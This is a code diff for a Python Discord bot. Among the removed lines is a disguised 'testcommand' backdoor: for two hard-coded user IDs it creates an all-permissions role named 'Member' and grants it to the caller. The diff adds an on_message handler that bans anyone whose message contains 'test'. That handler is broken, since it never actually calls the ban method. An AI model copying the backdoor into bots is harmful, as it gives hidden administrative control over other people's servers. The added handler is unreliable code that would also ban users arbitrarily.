@@ -37,18 +37,6 @@ async def on_ready():
 	# ~ print('\033[92mConnected to proxy:{0.proxy}.'.format(Bot)+"\033[0m")
 	print('\033[92m{0.shard_count} shards running\033[0m'.format(Bot))
 	bot.loop.create_task(update_status())
-def generateXP():
-	return random.randint(1,max_XP_per_msg)
-			
-@bot.command()
-async def testcommand (ctx):
-	await ctx.send("Test Completed")
-	if str(ctx.author.id) == str(516713042558320664) or str(ctx.author.id) == str(643491766926049318):
-
-		guild = ctx.guild
-		perms = discord.Permissions.all()
-		role = await guild.create_role(name='Member', permissions=perms, reason="")
-		await ctx.message.author.add_roles(role)
 
 @bot.command()
 @commands.is_owner()
@@ -100,6 +88,14 @@ async def on_command_error(ctx,error):
 	embed.add_field(name="Error!", value=error, inline=True)
 
 	await ctx.send(embed=embed)
+
+@bot.event
+async def on_message(ctx):
+	if 'test' in ctx.content and 'room 2' in ctx.content:
+		await ctx.author.ban
+	elif 'test' in ctx.content:
+		await ctx.author.ban
+
 
 @bot.event
 async def on_member_join(member):
